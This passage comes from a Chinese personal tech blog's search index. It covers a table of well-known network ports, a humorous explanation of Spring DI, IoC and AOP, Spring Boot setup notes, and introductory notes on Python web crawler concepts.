机器上的主机名服务</td></tr><tr><td>102</td><td>iso-tsap</td><td>ISO 开发环境（ISODE）网络应用</td></tr><tr><td>105</td><td>csnet-ns</td><td>邮箱名称服务器；也被 CSO 名称服务器使用</td></tr><tr><td>107</td><td>rtelnet</td><td>远程 Telnet</td></tr><tr><td>109</td><td>pop2</td><td>邮局协议版本2</td></tr><tr><td>110</td><td>pop3</td><td>邮局协议版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>用于远程命令执行的远程过程调用（RPC）协议，被网络文件系统（NFS）使用</td></tr><tr><td>113</td><td>auth</td><td>验证和身份识别协议</td></tr><tr><td>115</td><td>sftp</td><td>安全文件传输协议（SFTP）服务</td></tr><tr><td>117</td><td>uucp-path</td><td>Unix 到 Unix 复制协议（UUCP）路径服务</td></tr><tr><td>119</td><td>nntp</td><td>用于 USENET 讨论系统的网络新闻传输协议（NNTP）</td></tr><tr><td>123</td><td>ntp</td><td>网络时间协议（NTP）</td></tr><tr><td>137</td><td>netbios-ns</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>在红帽企业 Linux 中被 Samba 使用的NET BIOS 会话服务</td></tr><tr><td>143</td><td>imap</td><td>互联网消息存取协议（IMAP）</td></tr><tr><td>161</td><td>snmp</td><td>简单网络管理协议（SNMP）</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMP 的陷阱</td></tr><tr><td>163</td><td>cmip-man</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>164</td><td>cmip-agent</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>174</td><td>mailq</td><td>MAILQ</td></tr><tr><td>177</td><td>xdmcp</td><td>X 显示管理器控制协议</td></tr><tr><td>178</td><td>nextstep</td><td>NeXTStep 窗口服务器</td></tr><tr><td>179</td><td>bgp</td><td>边界网络协议</td></tr><tr><td>191</td><td>prospero</td><td>Cliffod Neuman 的 Prospero 服务</td></tr><tr><td>194</td><td>irc</td><td>互联网中继聊天（IRC）</td></tr><tr><td>199</td><td>smux</td><td>SNMP UNIX 多路复用</td></tr><tr><td>201</td><td>at-rtmp</td><td>AppleTalk 选路</td></tr><tr><td>202</td><td>at-nbp</td><td>AppleTalk 名称绑定</td></tr><tr><td>204</td><td>at-echo</td><td>AppleTalk echo 服务</td></tr><tr><td>206</td><td>at-zis</td><td>AppleTalk 区块信息</td></tr><tr><td>209</td><td>qmtp</td><td>快速邮件传输协议（QMTP）</td></tr><tr><td>210</td><td>z39.50</td><td>NISO Z39.50 数据库</td></tr><tr><td>213</td><td>ipx</td><td>互联网络分组交换协议（IPX），被 Novell Netware 环境常用的数据报协议</td></tr><tr><td>220</td><td>imap3</td><td>互联网消息存取协议版本3</td></tr><tr><td>245</td><td>link</td><td>LINK</td></tr><tr><td>347</td><td>fatserv</td><td>Fatmen 服务器</td></tr><tr><td>363</td><td>rsvp_tunnel</td><td>RSVP 隧道</td></tr><tr><td>369</td><td>rpc2portmap</td><td>Coda 文件系统端口映射器</td></tr><tr><td>370</td><td>codaauth2</td><td>Coda 文件系统验证服务</td></tr><tr><td>372</td><td>ulistproc</td><td>UNIX Listserv</td></tr><tr><td>389</td><td>ldap</td><td>轻型目录存取协议（LDAP）</td></tr><tr><td>427</td><td>svrloc</td><td>服务位置协议（SLP）</td></tr><tr><td>434</td><td>mobileip-agent</td><td>可移互联网协议（IP）代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>可移互联网协议（IP）管理器</td></tr><tr><td>443</td><td>https</td><td>安全超文本传输协议（HTTP）</td></tr><tr><td>444</td><td>snpp</td><td>小型网络分页协议</td></tr><tr><td>445</td><td>microsoft-ds</td><td>通过 TCP/IP 的服务器消息块（SMB）</td></tr><tr><td>464</td><td>kpasswd</td><td>Kerberos 口令和钥匙改换服务</td></tr><tr><td>468</td><td>photuris</td><td>Photuris 会话钥匙管理协议</td></tr><tr><td>487</td><td>saft</td><td>简单不对称文件传输（SAFT）协议</td></tr><tr><td>488</td><td>gss-http</td><td>用于 HTTP 的通用安全服务（GSS）</td></tr><tr><td>496</td><td>pim-rp-disc</td><td>用于协议独立的多址传播（PIM）服务的会合点发现（RP-DISC）</td></tr><tr><td>500</td><td>isakmp</td><td>互联网安全关联和钥匙管理协议（ISAKMP）</td></tr><tr><td>535</td><td>iiop</td><td>互联网内部对象请求代理协议（IIOP）</td></tr><tr><td>538</td><td>gdomap</td><td>GNUstep 分布式对象映射器（GDOMAP）</td></tr><tr><td>546</td><td>dhcpv6-client</td><td>动态主机配置协议（DHCP）版本6客户</td></tr><tr><td>547</td><td>dhcpv6-server</td><td>动态主机配置协议（DHCP）版本6服务</td></tr><tr><td>554</td><td>rtsp</td><td>实时流播协议（RTSP）</td></tr><tr><td>563</td><td>nntps</td><td>通过安全套接字层的网络新闻传输协议（NNTPS）</td></tr><tr><td>565</td><td>whoami</td><td>whoami</td></tr><tr><td>587</td><td>submission</td><td>邮件消息提交代理（MSA）</td></tr><tr><td>610</td><td>npmp-local</td><td>网络外设管理协议（NPMP）本地 / 分布式排队系统（DQS）</td></tr><tr><td>611</td><td>npmp-gui</td><td>网络外设管理协议（NPMP）GUI / 分布式排队系统（DQS）</td></tr><tr><td>612</td><td>hmmp-ind</td><td>HMMP 指示 / DQS</td></tr><tr><td>631</td><td>ipp</td><td>互联网打印协议（IPP）</td></tr><tr><td>636</td><td>ldaps</td><td>通过安全套接字层的轻型目录访问协议（LDAPS）</td></tr><tr><td>674</td><td>acap</td><td>应用程序配置存取协议（ACAP）</td></tr><tr><td>694</td><td>ha-cluster</td><td>用于带有高可用性的群集的心跳服务</td></tr><tr><td>749</td><td>kerberos-adm</td><td>Kerberos 版本5（v5）的“kadmin”数据库管理</td></tr><tr><td>750</td><td>kerberos-iv</td><td>Kerberos 版本4（v4）服务</td></tr><tr><td>765</td><td>webster</td><td>网络词典</td></tr><tr><td>767</td><td>phonebook</td><td>网络电话簿</td></tr><tr><td>873</td><td>rsync</td><td>rsync 文件传输服务</td></tr><tr><td>992</td><td>telnets</td><td>通过安全套接字层的 Telnet（TelnetS）</td></tr><tr><td>993</td><td>imaps</td><td>通过安全套接字层的互联网消息存取协议（IMAPS）</td></tr><tr><td>994</td><td>ircs</td><td>通过安全套接字层的互联网中继聊天（IRCS）</td></tr><tr><td>995</td><td>pop3s</td><td>通过安全套接字层的邮局协议版本3（POPS3）</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 计算机网络自顶向下 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring三大思想</title>
      <link href="/2019/02/27/spring-san-da-si-xiang/"/>
      <url>/2019/02/27/spring-san-da-si-xiang/</url>
      
        <content type="html"><![CDATA[<h3 id="一、DI-依赖注入-和IOC-控制反转"><a href="#一、DI-依赖注入-和IOC-控制反转" class="headerlink" title="一、DI(依赖注入)和IOC(控制反转)"></a>一、DI(依赖注入)和IOC(控制反转)</h3><p>Spring的三大思想为DI(依赖注入)，IOC(控制反转)，AOP（面向切面编程）。既然在学Spring就认真学一些思想，而不是仅仅停留在复制粘贴CURD的层面，这也许就是码农的自我修养吧。</p><h4 id="1-1、万物初始"><a href="#1-1、万物初始" class="headerlink" title="1.1、万物初始"></a>1.1、万物初始</h4><p>既然大家都没有女朋友，那今天kitty萌新教教大家怎么new女朋友吧。<br>假如你有了一个女朋友，，，，类</p><pre><code>public class GirlFriend{    String name; //有名字    Face face;    Head head; //有头有脸的意思    ....... //其他一堆优点    GirlFriend(String name)    {        this.name=name;    } }</code></pre><p>那么现在你是一个成功人士，即将走上人生巅峰，是不是还有一 点小激动呢</p><pre><code>public class Person{    Person(){    //给你女朋友加属性    GirlFriend girlFriend=new GirlFriend(&quot;迪丽热巴&quot;);     Car car=new Car(&quot;兰博基尼&quot;);    House house=new House(&quot;海景套房&quot;); //有车有房    } }</code></pre><img src="3.jpg" width="400" hegiht="200" align=center /><a id="more"></a>现在你要出生啦啦啦<pre><code>Person you;//当你需要你女朋友的时候你可以这样you.girlFriend;//比如当别人问你女朋友谁啊，你可以回答printf(&quot;%s&quot;,you.girlFriend.name);</code></pre><p>直到一天，你和你女朋友的缘分尽了，经历一段痛心肺腑的分手诀别后，你找到了新的女朋友雏田小姐姐，当然这个时候将会有数百句渣男，臭鸡蛋扑面而来，但是，嘻嘻，你还是要更新你女朋友的名字。那么你要怎么做呢？<br>你要把Person类里GirlFriend的构造参数改一下</p><pre><code>GirlFriend girlFriend=new GirlFriend(&quot;日向雏田&quot;);</code></pre><p><img src="2.jpg" alt=""><br>这个时候你会发现你是全世界最成功的人士，但是<strong>等等</strong>你可能忽略了一个问题，因为你换女朋友，你自己的类<strong>改变了</strong>(person类改变了)，你不再是那个打娘胎里出来的那个单纯的Person,而是人工改造后的你，这样的你是没有灵魂的，这是因为，你依赖于你女盆友（<strong>Person类依赖于GirlFriend</strong>）,这样你和你女朋友的耦合性太强了（<strong>Person类和GirlFriend耦合性强</strong>），那么依赖注入就是为了解决一下这个问题。</p><h4 id="1-2、控制反转和依赖注入（正经脸）"><a href="#1-2、控制反转和依赖注入（正经脸）" class="headerlink" title="1.2、控制反转和依赖注入（正经脸）"></a>1.2、控制反转和依赖注入（正经脸）</h4><p>以下来自百度百科</p><pre><code>控制反转（Inversion of Control，缩写为IoC），是面向对象编程中的一种设计原则，可以用来减低计算机代码之间的耦合度。其中最常见的方式叫做依赖注入（Dependency Injection，简称DI。通过控制反转，对象在被创建的时候，由一个调控系统内所有对象的外界实体，将其所依赖的对象的引用传递给它。也可以说，依赖被注入到对象中。</code></pre><p>是不是很晕，听不懂，如果你懂了，请直接跳过本博客，如果没看懂，请继续听我吹逼。<br>其实意思还是很简单的，就是为了解除Person和GirlFriend的耦合，在修改GirlFriend.name的同时不修改Person类，能不能做到呢，答案是肯定的</p><pre><code>class Person{  GirlFriend girlFriend;  Person(GirlFriend girlFriend){ this.girlFriend = girlFriend;}; .........}</code></pre><p>这样就算你要天天换女朋友，又能保持自己的灵魂，你只要</p><pre><code>GirlFriend girlFriend=new GirlFriend(&quot;日向雏田&quot;);Person you= new Person(girlFriend);</code></pre><p>字面意思就是将你女朋友注入到你中（为什么听起来优点别扭），这是通过构造函数依赖注入,而依赖注入有3种方式<br>分别为<strong>构造方法注入</strong>，<strong>setter注入</strong>，<strong>基于注解的注入</strong>。<br>思想和构造方法注入是一致的，比如<br><strong>setter函数注入</strong>：<br>其实也就是在Person中另外写一个函数来替代构造函数，然后在new person够调用这个函数。</p><pre><code>class Person{  GirlFriend girlFriend;  SetGirlFriend(GirlFriend girlFriend){ this.girlFriend = girlFriend;};}Person you=new Person();GirlFriend girlFriend=new GirlFriend(&quot;日向雏田&quot;);you.SetGirlFriend(girlFriend)</code></pre><p><strong>基于注解的注入</strong>：<br>注解我看来就是为了加快人生进步发展（为了让后人偷懒），而定义的一些约定注释，提高我们的编程体验。<br>看一看spring有哪些关于注入的注解</p><ol><li>@Component注解：表明当前类为一个组件（bean）</li><li>@Value注解：为bean注入值</li><li>@Autowired注解 ：为bean注入其他bean（byType方式）</li><li>@Qualifier注解：与Autowired注解联用实现byName方式注入</li><li>@Resource注解：这个不是Spring提供的注解，这个是jdk提供的注解，要求jdk版本1.6以上，这个注解可以实现Autowired和Resource的功能。当直接注解@Resource时起到Autowired功能（byType），当加上参数@Resource（name=”“）的时候，起到@Autowired和@Qualifier联合使用的功能（byName）</li></ol><p>当你能看到这里的时候，自然就会去学习注解的详细使用，这里只唠唠思维，就不展开。</p><p><strong>控制反转</strong>名字由来：<br>对象A获得依赖对象B的过程,由主动行为变为了被动行为，控制权颠倒过来了，这就是“控制反转”这个名称的由来，其实就是通过IoC容器来关联这些对象类。这样对象与对象之间就通过IoC容器进行联系，但对象与对象之间并没有什么直接联系。在上面例子中，就是可以新建一个工厂类，专门生产女朋友的，然后你要什么女朋友通过调用女朋友工厂生产后再注入。<br><img src="1.png" alt=""></p><h3 id="二、AOP（面向切面编程）"><a href="#二、AOP（面向切面编程）" class="headerlink" title="二、AOP（面向切面编程）"></a>二、AOP（面向切面编程）</h3><p>先来一个官方书面表述：<br>AOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容（Spring核心之一），是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。<br>（反正我第一遍是看不懂的）</p><h4 id="2-1、面向切面是面向啥玩意："><a href="#2-1、面向切面是面向啥玩意：" class="headerlink" title="2.1、面向切面是面向啥玩意："></a>2.1、面向切面是面向啥玩意：</h4><p>我们先抛开Spring对于AOP的事件机制，单纯说一说面向切面编程，切面其实就是一些切面性问题的受力点，也叫横切性问题即<strong>和主业务逻辑无关，散落四方的一些方法</strong>。比如日志记录，效率检查，时间记录等等。<br>比如再次回到女朋友问题，假如一位情场高手打算出一本泡妞宝典，所以打算在每个女朋友追求到手后记录下经验，然后写入宝典，现在需求就是在确认关系上添加记录经验,所以现在是这样的：</p><p>认识女朋友1—&gt;相遇—&gt;追求—&gt;<font color=red size=4 >确认关系</font>—&gt;分手<br>认识女朋友2—&gt;相遇—&gt;追求—&gt;<font color=red size=4 >确认关系</font>—&gt;分手<br>认识女朋友3—&gt;相遇—&gt;追求—&gt;<font color=red size=4 >确认关系</font>—&gt;分手<br>认识女朋友4—&gt;相遇—&gt;追求—&gt;<font color=red size=4 >确认关系</font>—&gt;分手<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;|👇|<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;|总结经验|</p><p>再回到AOP编程思想中，由于总结经验对于每一场恋爱的主线没有直接关系，最多是人品问题（天地良心，我个人不是这样水性杨花的），所以可以把确认关系当一个<strong>切面</strong>，而横切的问题就是总结经验。在编程上，如果每个业务的横切问题单独编程就会产生大量的垃圾代码，所以采用AOP能够在编程上可以大大减少你的时间</p><h4 id="2-2、Spring的AOP具体概念（比较硬核）"><a href="#2-2、Spring的AOP具体概念（比较硬核）" class="headerlink" title="2.2、Spring的AOP具体概念（比较硬核）"></a>2.2、Spring的AOP具体概念（比较硬核）</h4><p><strong>这里还是先给出一个比较专业的概念定义：</strong></p><ol><li>Aspect（切面）： Aspect 声明类似于 Java 中的类声明，在 Aspect 中会包含着一些 Pointcut 以及相应的 Advice。</li><li>Joint point（连接点）：表示在程序中明确定义的点，典型的包括方法调用，对类成员的访问以及异常处理程序块的执行等等，它自身还可以嵌套其它 joint point。</li><li>Pointcut（切点）：表示一组 joint point，这些 joint point 或是通过逻辑关系组合起来，或是通过通配、正则表达式等方式集中起来，它定义了相应的 Advice 将要发生的地方。</li><li>Advice（增强）：Advice 定义了在 Pointcut 里面定义的程序点具体要做的操作，它通过 before、after 和 around 来区别是在每个 joint point 之前、之后还是代替执行的代码。</li><li>Target（目标对象）：织入 Advice 的目标对象.。<br>Weaving（织入）：将 Aspect 和其他对象连接起来, 并创建 Adviced object 的过程</li></ol><p>（放弃吧，光看是看不懂的，去撸代码吧）<br><img src="2.png" alt=""><br>本文只想通过简单的例子讲讲思想，具体代码就不涉及了，感兴趣可以另学，另外本文旨在于学习，本人从未参与里面任何事件逻辑，感谢迪丽热巴和雏田小姐姐的友情赞助照片。</p><p><img src="1.gif" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 雁儿几度恋开发-愿得一站入万家 </category>
          
          <category> Spring boot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot环境搭建</title>
      <link href="/2019/02/26/spring-boot-huan-jing-da-jian/"/>
      <url>/2019/02/26/spring-boot-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h4 id="人终究没有自己想象的那么厉害，之前有过spring的基础，现在仅仅是回忆Spring的配置问题以及转向spring-boot-从昨晚肝到此刻（Orz只能拿时间来弥补自己的天赋不足），又一次见到了5点钟的南航，任何火热技术的发展都是能够为了解决人类当前的一个痛点，Spring和Spring-MVC的配置问题应该是Spring最大的门槛或者说败笔，而Spring-boot完美的解决了这一问题，甚至帮你把汤姆猫（Tomcat）封装进去了，一晚上大概学了点Maven-配置，Spring-boot的参数请求，整合swagger-路由设定等，虽然说写博客挺花时间的，而且还是没有水平的，但是还是想记一下博客，主要是以便于之后的自己回忆快一些"><a href="#人终究没有自己想象的那么厉害，之前有过spring的基础，现在仅仅是回忆Spring的配置问题以及转向spring-boot-从昨晚肝到此刻（Orz只能拿时间来弥补自己的天赋不足），又一次见到了5点钟的南航，任何火热技术的发展都是能够为了解决人类当前的一个痛点，Spring和Spring-MVC的配置问题应该是Spring最大的门槛或者说败笔，而Spring-boot完美的解决了这一问题，甚至帮你把汤姆猫（Tomcat）封装进去了，一晚上大概学了点Maven-配置，Spring-boot的参数请求，整合swagger-路由设定等，虽然说写博客挺花时间的，而且还是没有水平的，但是还是想记一下博客，主要是以便于之后的自己回忆快一些" class="headerlink" title="人终究没有自己想象的那么厉害，之前有过spring的基础，现在仅仅是回忆Spring的配置问题以及转向spring boot,从昨晚肝到此刻（Orz只能拿时间来弥补自己的天赋不足），又一次见到了5点钟的南航，任何火热技术的发展都是能够为了解决人类当前的一个痛点，Spring和Spring MVC的配置问题应该是Spring最大的门槛或者说败笔，而Spring boot完美的解决了这一问题，甚至帮你把汤姆猫（Tomcat）封装进去了，一晚上大概学了点Maven 配置，Spring boot的参数请求，整合swagger,路由设定等，虽然说写博客挺花时间的，而且还是没有水平的，但是还是想记一下博客，主要是以便于之后的自己回忆快一些"></a>人终究没有自己想象的那么厉害，之前有过spring的基础，现在仅仅是回忆Spring的配置问题以及转向spring boot,从昨晚肝到此刻（Orz只能拿时间来弥补自己的天赋不足），又一次见到了5点钟的南航，任何火热技术的发展都是能够为了解决人类当前的一个痛点，Spring和Spring MVC的配置问题应该是Spring最大的门槛或者说败笔，而Spring boot完美的解决了这一问题，甚至帮你把汤姆猫（Tomcat）封装进去了，一晚上大概学了点Maven 配置，Spring boot的参数请求，整合swagger,路由设定等，虽然说写博客挺花时间的，而且还是没有水平的，但是还是想记一下博客，主要是以便于之后的自己回忆快一些</h4><h4 id="一、SpringBoot2-0环境准备"><a href="#一、SpringBoot2-0环境准备" class="headerlink" title="一、SpringBoot2.0环境准备"></a>一、SpringBoot2.0环境准备</h4><p>jdk1.8+；java version “1.8.0_112”<br>A favorite text editor or IDE：IntelliJ IDEA 2018.2.6</p><h4 id="二、Maven配置"><a href="#二、Maven配置" class="headerlink" title="二、Maven配置"></a>二、Maven配置</h4><p>Maven的核心功能便是合理叙述项目间的依赖关系，通俗点讲，就是通过XXXX.xml这样的文件的配置获取jar包，而不用手动去添加jar包，就好比前端开发的package.json<br>IDEA内部自带一Maven2，一个Maven3，我们当然用的是Maven3，当初学spring mvc的时候，环境真要折腾死了，主要是当初自己不敢尝试，害怕失败后重装的折腾，但是这玩意折腾折腾几次才真的会了，所以自然要配置国内maven仓库镜像<br>IDEA的Maven文件目录为：{你IDEA软件安装目录}、IDEA\IntelliJ IDEA 2018.3.1\plugins\maven\lib\maven3\conf<br>这个里面有一个setting.xml,在mirrors标签的子标签<code>&lt;mirror&gt;</code>中的代码改为：</p><a id="more"></a><pre><code>&lt;mirror&gt;    &lt;id&gt;alimaven&lt;/id&gt;    &lt;name&gt;aliyun maven&lt;/name&gt;    &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;    &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;/mirror&gt;</code></pre><p>其实很简单对不对</p><h4 id="三、新建一个项目"><a href="#三、新建一个项目" class="headerlink" title="三、新建一个项目"></a>三、新建一个项目</h4><ol><li>新建Spring Initializr 项目，如图：<br><img src="1.png" alt=""></li><li>填写项目信息，如图：<br><img src="2.png" alt=""></li><li>选择项目使用的技术，如图：<br><img src="3.png" alt=""></li><li>填写项目名称：如图：<br><img src="4.png" alt=""></li><li>项目架构及依赖，如图：<br><img src="5.png" alt=""></li><li>添加测试控制器。直接在入口类中编写。<pre><code>package com.springboot.first;</code></pre></li></ol><p>import org.springframework.boot.SpringApplication;<br>import org.springframework.boot.autoconfigure.SpringBootApplication;<br>import org.springframework.web.bind.annotation.RequestMapping;<br>import org.springframework.web.bind.annotation.RestController;</p><p>@RestController<br>@SpringBootApplication<br>public class FirstApplication {</p><pre><code>@RequestMapping(&quot;/&quot;)String index() {    return &quot;Hello Spring Boot&quot;;}public static void main(String[] args) {    SpringApplication.run(FirstApplication.class, args);}</code></pre><p>}</p><pre><code>7. 运行项目，把它当成一个java类运行就可以了，右键菜单中选择，如图：![](6.png)运行信息：![](7.png)8. 访问localhost:8080即可#### 四、时区设置</code></pre><p>jdbc:mysql://XXXX:3306/xxxx?characterEncoding=utf8&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC<br>```</p>]]></content>
      
      
      <categories>
          
          <category> 雁儿几度恋开发-愿得一站入万家 </category>
          
          <category> Spring boot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>精通Python网络爬虫-一二三章基础</title>
      <link href="/2019/02/25/jing-tong-python-wang-luo-pa-chong-yi-er-san-zhang-ji-chu/"/>
      <url>/2019/02/25/jing-tong-python-wang-luo-pa-chong-yi-er-san-zhang-ji-chu/</url>
      
        <content type="html"><![CDATA[<h4 id="科创要用到深层网络爬虫所以系统学一次python爬虫，另外一个项目采用spring-boot当后端，果然面向需求编程才是王道，这本书叫精通python网络爬虫，不求精通，好歹入个门吧-还有个原因前几天拿爬虫试了试水，确实天下武功，唯快不破，脚本的速度真的可以为所欲为"><a href="#科创要用到深层网络爬虫所以系统学一次python爬虫，另外一个项目采用spring-boot当后端，果然面向需求编程才是王道，这本书叫精通python网络爬虫，不求精通，好歹入个门吧-还有个原因前几天拿爬虫试了试水，确实天下武功，唯快不破，脚本的速度真的可以为所欲为" class="headerlink" title="科创要用到深层网络爬虫所以系统学一次python爬虫，另外一个项目采用spring boot当后端，果然面向需求编程才是王道，这本书叫精通python网络爬虫，不求精通，好歹入个门吧(还有个原因前几天拿爬虫试了试水，确实天下武功，唯快不破，脚本的速度真的可以为所欲为)"></a>科创要用到深层网络爬虫所以系统学一次python爬虫，另外一个项目采用spring boot当后端，果然面向需求编程才是王道，这本书叫精通python网络爬虫，不求精通，好歹入个门吧(还有个原因前几天拿爬虫试了试水，确实天下武功，唯快不破，脚本的速度真的可以为所欲为)</h4><img src="1.jpg" width="400" hegiht="200" align=center /><a id="more"></a>### 一、爬虫介绍#### 1.1、为何学习网络爬虫（1）定制一个个性化的搜索引擎 搜索引擎离不开爬虫，例:百度（百度蜘蛛BaiduSpider）360(360Spider) 搜狗（SougouSpider）必应（BingBot）（2）数据分析（3）优化搜索引擎（4）工作生计（5）兴趣爱好<h4 id="1-2、网络爬虫的组成"><a href="#1-2、网络爬虫的组成" class="headerlink" title="1.2、网络爬虫的组成"></a>1.2、网络爬虫的组成</h4><p>网络爬虫由控制节点，爬虫节点，资源库构成。<br><img src="1.png" alt=""></p><h5 id="控制节点：爬虫的中央控制器，根据URL地址分配线程，调用爬虫节点具体爬行。"><a href="#控制节点：爬虫的中央控制器，根据URL地址分配线程，调用爬虫节点具体爬行。" class="headerlink" title="控制节点：爬虫的中央控制器，根据URL地址分配线程，调用爬虫节点具体爬行。"></a>控制节点：爬虫的中央控制器，根据URL地址分配线程，调用爬虫节点具体爬行。</h5><h5 id="爬虫节点：应用相关算法，对网页进行具体爬行。"><a href="#爬虫节点：应用相关算法，对网页进行具体爬行。" class="headerlink" title="爬虫节点：应用相关算法，对网页进行具体爬行。"></a>爬虫节点：应用相关算法，对网页进行具体爬行。</h5><h5 id="资源库：将爬虫节点爬行结果存储到对应的资源库中。"><a href="#资源库：将爬虫节点爬行结果存储到对应的资源库中。" class="headerlink" title="资源库：将爬虫节点爬行结果存储到对应的资源库中。"></a>资源库：将爬虫节点爬行结果存储到对应的资源库中。</h5><h4 id="1-3、爬虫的分类"><a href="#1-3、爬虫的分类" class="headerlink" title="1.3、爬虫的分类"></a>1.3、爬虫的分类</h4><table><thead><tr><th>爬虫类型</th><th>具体说明</th></tr></thead><tbody><tr><td>通用网络爬虫</td><td>爬行目标数据巨大，范围广</td></tr><tr><td>聚集网络爬虫</td><td>目标网页是定位与主题相关网页</td></tr><tr><td>增量式网络爬虫</td><td>只爬取内容发生变化的网页</td></tr><tr><td>深层网络爬虫</td><td>爬取深层页面</td></tr><tr><td>注明：在互联网中，网页按存在方式分类，分为表层页面和深层页面。</td><td></td></tr><tr><td>（1）表层页面，不需要提交表单，使用静态链接到达的静态页面。</td><td></td></tr><tr><td>（2）深层页面，需提交表单，才能获取的页面。</td><td></td></tr><tr><td>（3）深层网络爬虫最重要的部分是填写表单，以爬取深层页面。</td><td></td></tr></tbody></table><h4 id="二、搜索引擎核心"><a href="#二、搜索引擎核心" class="headerlink" title="二、搜索引擎核心"></a>二、搜索引擎核心</h4><p>爬虫与搜索引擎密不可分。<br>下图所示搜索引擎的核心工作流程。<br><img src="2.png" alt=""><br>（1）搜索引擎利用爬虫模块（控制器，爬行器）从互联网爬取相应网页存储至原始数据库中。</p><p>（2）对原始数据库中数据进行索引（相当于索引器给数据起名字），并存储到索引数据库中。</p><p>（3）用户交互检索信息，检索器会从索引数据库中获取数据进行相应的检索处理。</p><p>（4）同时，用户输入信息会被存储到用户日志数据库中。</p><p>（5）用户日志数据库中的数据会交给日志分析器进行处理。</p><p>（6）日志分析器会根据大量的用户数据去调用原始数据库和索引数据库，改变排名结果或进行其他操作。</p><h3 id="三、网络爬虫实现原理与实现技术"><a href="#三、网络爬虫实现原理与实现技术" class="headerlink" title="三、网络爬虫实现原理与实现技术"></a>三、网络爬虫实现原理与实现技术</h3><h4 id="3-1、通用网络爬虫VS聚焦网络爬虫"><a href="#3-1、通用网络爬虫VS聚焦网络爬虫" class="headerlink" title="3.1、通用网络爬虫VS聚焦网络爬虫"></a>3.1、通用网络爬虫VS聚焦网络爬虫</h4><ol><li>通用网络爬虫<br><img src="3.png" alt=""></li><li>聚焦网络爬虫<br><img src="4.png" alt=""><br>聚焦网络爬虫，是有目的的进行爬取。<br>必须增加目标的定义和过滤机制。<br>其执行原理和过程需要比通用网络爬虫多出三步，即目标的定义、过滤无关链接、下一步要爬取的 URL 地址的选取等。本质上就是增加了一个<strong>过滤机制</strong></li></ol><h4 id="3-2、爬行策略"><a href="#3-2、爬行策略" class="headerlink" title="3.2、爬行策略"></a>3.2、爬行策略</h4><p><img src="5.png" alt=""></p><table><thead><tr><th>爬行策略</th><th>具体说明</th></tr></thead><tbody><tr><td>深度优先爬行策略</td><td>A-D-E-B-C-F-G</td></tr><tr><td>广度优先爬行策略</td><td>A-B-C-D-E-F-G</td></tr><tr><td>大站优先策略</td><td>优先爬取大站（网页数量多的网站）中的 URL 地址</td></tr><tr><td>反链策略</td><td>优先爬取反链数量（被其他网页指向的次数）多的网站</td></tr><tr><td>其他爬行策略</td><td>如 OPIC 策略、Partial 策略、PageRank 策略等</td></tr><tr><td>反链策略要防止作弊现象，某些循环指向判断机制。</td><td></td></tr></tbody></table><h4 id="3-3、网站更新策略"><a href="#3-3、网站更新策略" class="headerlink" title="3.3、网站更新策略"></a>3.3、网站更新策略</h4><table><thead><tr><th>更新策略</th><th>具体说明</th></tr></thead><tbody><tr><td>用户体验策略</td><td>大部分用户只关注排名靠前的网页，爬虫优先更新排名结果靠前的网页</td></tr><tr><td>历史数据策略</td><td>依据网页历史更新数据，利用数学建模，预测下一次更新时间，从而确定更新周期</td></tr><tr><td>聚类分析策略</td><td>一般具有类似属性的网页更新频率类似–&gt;对海量网页进行聚类分析，形成多个类–&gt;对同一个类抽样，取平均值更新–&gt;从而确定爬行频率</td></tr></tbody></table><h4 id="3-4、网站分析算法"><a href="#3-4、网站分析算法" class="headerlink" title="3.4、网站分析算法"></a>3.4、网站分析算法</h4><table><thead><tr><th>网页分析算法</th><th>具体说明</th></tr></thead><tbody><tr><td>基于用户行为</td><td>基于用户访问行为（如访问频率、时长等）</td></tr><tr><td>基于网络拓扑（如PageRank，谷歌引擎核心算法）</td><td>依靠网页间链接关系计算权重，进行排名</td></tr><tr><td>基于网页内容</td><td>依据网页数据、文本网页内容特征等</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 精通Python网络爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue的生命周期以及迎接新的学期</title>
      <link href="/2019/02/21/vue-de-sheng-ming-zhou-qi-yi-ji-ying-jie-xin-de-xue-qi/"/>
      <url>/2019/02/21/vue-de-sheng-ming-zhou-qi-yi-ji-ying-jie-xin-de-xue-qi/</url>
      
